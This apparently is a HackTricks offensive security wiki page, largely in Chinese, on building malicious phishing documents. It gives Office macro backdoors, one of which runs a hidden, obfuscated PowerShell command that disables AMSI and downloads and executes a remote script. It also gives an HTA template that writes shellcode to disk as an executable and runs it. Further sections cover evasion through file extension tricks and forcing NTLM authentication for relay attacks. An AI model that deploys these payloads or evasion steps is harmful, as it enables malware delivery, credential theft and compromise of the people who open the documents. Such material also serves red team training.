# Phishing Files & Documents

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Office Documents

Microsoft Word 在打开文件之前会执行文件数据验证。数据验证以数据结构识别的形式进行，符合 OfficeOpenXML 标准。如果在数据结构识别过程中发生任何错误，正在分析的文件将无法打开。

通常，包含宏的 Word 文件使用 `.docm` 扩展名。然而，可以通过更改文件扩展名来重命名文件，并仍然保持其宏执行能力。\
例如，RTF 文件设计上不支持宏，但将 DOCM 文件重命名为 RTF 后，将由 Microsoft Word 处理，并能够执行宏。\
相同的内部机制适用于 Microsoft Office 套件的所有软件（Excel、PowerPoint 等）。

您可以使用以下命令检查某些 Office 程序将执行哪些扩展名：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 文件引用远程模板（文件 - 选项 - 插件 - 管理：模板 - 转到）并包含宏时，也可以“执行”宏。

### 外部图像加载

转到：_插入 --> 快速部件 --> 字段_\
&#xNAN;_**类别**：链接和引用，**字段名称**：includePicture，**文件名或 URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### 宏后门

可以使用宏从文档中运行任意代码。

#### 自动加载函数

它们越常见，AV 检测到它们的可能性就越大。

* AutoOpen()
* Document\_Open()

#### 宏代码示例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手动删除元数据

转到 **文件 > 信息 > 检查文档 > 检查文档**，这将打开文档检查器。点击 **检查**，然后在 **文档属性和个人信息** 旁边点击 **全部删除**。

#### 文档扩展名

完成后，选择 **另存为类型** 下拉菜单，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**。\
这样做是因为你 **不能在 `.docx` 中保存宏**，并且 **`.docm`** 扩展名有一个 **污名**（例如，缩略图图标上有一个巨大的 `!`，一些网络/电子邮件网关完全阻止它们）。因此，这个 **遗留的 `.doc` 扩展名是最佳折衷**。

#### 恶意宏生成器

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 文件

HTA 是一个 Windows 程序，它 **结合了 HTML 和脚本语言（如 VBScript 和 JScript）**。它生成用户界面并作为“完全信任”的应用程序执行，且不受浏览器安全模型的限制。

HTA 使用 **`mshta.exe`** 执行，通常与 **Internet Explorer** 一起 **安装**，使得 **`mshta` 依赖于 IE**。因此，如果它被卸载，HTA 将无法执行。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## 强制 NTLM 认证

有几种方法可以**“远程”强制 NTLM 认证**，例如，您可以在用户访问的电子邮件或 HTML 中添加**隐形图像**（甚至是 HTTP MitM？）。或者将**文件地址**发送给受害者，这将**触发**仅仅**打开文件夹**所需的**认证**。

**在以下页面中查看这些想法和更多内容：**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM 中继

不要忘记，您不仅可以窃取哈希或认证，还可以**执行 NTLM 中继攻击**：

* [**NTLM 中继攻击**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM 中继到证书)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
